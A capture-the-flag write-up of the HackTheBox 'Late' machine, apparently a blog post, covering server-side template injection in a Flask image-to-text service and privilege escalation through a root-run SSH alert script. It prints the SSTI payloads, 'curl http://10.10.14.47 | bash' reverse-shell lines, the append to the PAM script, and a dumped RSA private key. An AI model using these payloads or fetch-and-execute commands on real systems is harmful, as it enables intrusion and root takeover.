---
title: "HackTheBox: Late WriteUp"
layout: "post"
categories: [HackTheBox,Easy]
tags: [Easy]
---
Late is the HackTheBox easy box. Which start with finding the subdomain. The subdomain has upload option, which converts the image to text. It is vulnerbale to STTI.Using it we get the RCE. For privilege escalation, we are required to enumerate files in the victim machine owned by the user and modify a script that will be executed by root whenever we SSH into the machine. 
# Recon:

## Nmap:
```txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
|_http-title: Late - Best online image tools
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

There are two open port. 

## Port 80:

The homepage of the website has a static webpage. 
![late-1.png](/assets/img/late/late-1.png)

In the FAQ section I have found a subdomain.

![late-2.png](/assets/img/late/late-2.png)

I have added the entry of subdomain in **/etc/hosts** to resolve the hostname.

```txt
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.156    late.htb images.late.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```


## images.late.htb

The subdomain has the image upload functionality, which converts the uploaded images to text.


![late-3.png](/assets/img/late/late-3.png)

In title we can see that the Flask framework is used to convert the image to text.


## Foothold
We have to upload the image file, for that I wrote a simple python code to convert the  text to image.

```python
from PIL import Image, ImageDraw, ImageFont

def getSize(txt, font):
    testImg = Image.new('RGB', (1, 1))
    testDraw = ImageDraw.Draw(testImg)
    return testDraw.textsize(txt, font)

if __name__ == '__main__':

    fontname = "RobotoSlab-VariableFont_wght.ttf"
    fontsize = 30   
    text = """payload"""
    
    colorText = "black"
    colorOutline = "red"
    colorBackground = "white"


    font = ImageFont.truetype(fontname, fontsize)
    width, height = getSize(text, font)
    img = Image.new('RGB', (width+100, height+100), colorBackground)
    d = ImageDraw.Draw(img)
    d.text((2, height/2), text, fill=colorText, font=font)
    #d.rectangle((0, 0, width+3, height+3), outline=colorOutline)
    
    img.save("test.png")


```

Since the application is flask, first thing I tried is template injection. I have used simple payload 

```
{7*7}
```

In below image we can see that it retrun the 49.

![late-4.png](/assets/img/late/late-4.png)


## RCE
To get the command execution I used the following payload.

```
{% raw %}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{% endraw %}
```

```python
from PIL import Image, ImageDraw, ImageFont

def getSize(txt, font):
    testImg = Image.new('RGB', (1, 1))
    testDraw = ImageDraw.Draw(testImg)
    return testDraw.textsize(txt, font)

if __name__ == '__main__':

    fontname = "RobotoSlab-VariableFont_wght.ttf"
    fontsize = 30
    {% raw %}   
    text = """{{ cycler.__init__.__globals__.os.popen('id').read() }}"""
    {% endraw %}
    
    colorText = "black"
    colorOutline = "red"
    colorBackground = "white"


    font = ImageFont.truetype(fontname, fontsize)
    width, height = getSize(text, font)
    img = Image.new('RGB', (width+100, height+100), colorBackground)
    d = ImageDraw.Draw(img)
    d.text((2, height/2), text, fill=colorText, font=font)
    #d.rectangle((0, 0, width+3, height+3), outline=colorOutline)
    
    img.save("test.png")



```

Created the image using above code. After uploading it we got the command execution.

![late-5.png](/assets/img/late/late-5.png)

## Reverse shell

The below script will make a curl request to our http server from their it will fetch the revserse shell content and execute the code.

```txt
{% raw %}
{{ cycler.__init__.__globals__.os.popen("curl http://10.10.14.47 | bash").read() }}
{% endraw %}
```


```python
from PIL import Image, ImageDraw, ImageFont

def getSize(txt, font):
    testImg = Image.new('RGB', (1, 1))
    testDraw = ImageDraw.Draw(testImg)
    return testDraw.textsize(txt, font)

if __name__ == '__main__':

    fontname = "RobotoSlab-VariableFont_wght.ttf"
    fontsize = 30
    {% raw %}   
    text = """{{ cycler.__init__.__globals__.os.popen("curl http://10.10.14.47 | bash").read() }}"""
    {% endraw %}
    colorText = "black"
    colorOutline = "red"
    colorBackground = "white"


    font = ImageFont.truetype(fontname, fontsize)
    width, height = getSize(text, font)
    img = Image.new('RGB', (width+100, height+100), colorBackground)
    d = ImageDraw.Draw(img)
    d.text((2, height/2), text, fill=colorText, font=font)
    #d.rectangle((0, 0, width+3, height+3), outline=colorOutline)
    
    img.save("test.png")
```

![late-6.png](/assets/img/late/late-6.png)

## User flag

In home dir of svc_acc we found id_rsa.
```txt
svc_acc@late:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

```

Used the id_rsa to connect to the user.

```txt
──(kali㉿kali)-[~/htb/late]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/htb/late]
└─$ ssh -i id_rsa svc_acc@late.htb
svc_acc@late:~$
```

## ROOT

I have checked the each dir for a file which are own by user svc_acc. in /usr dir I have found one file.
```txt

svc_acc@late:~$ find / -user  svc_acc 2>/dev/null | grep /usr
/usr/local/sbin
/usr/local/sbin/ssh-alert.sh

```

/usr/local/sbin/ssh-alert.sh:
```bash

#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


```

We can not write the content to the file.
```txt
svc_acc@late:~$ ls -l /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 Aug  1 11:16 /usr/local/sbin/ssh-alert.sh
```

We can append the content to the file.

```
svc_acc@late:~$ echo " curl http://10.10.14.47/ |bash" >> /usr/local/sbin/ssh-alert.sh
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


 curl http://10.10.14.47/ |bash

```

This file will trigger when we try to login through ssh.
![late-7.png](/assets/img/late/late-7.png)
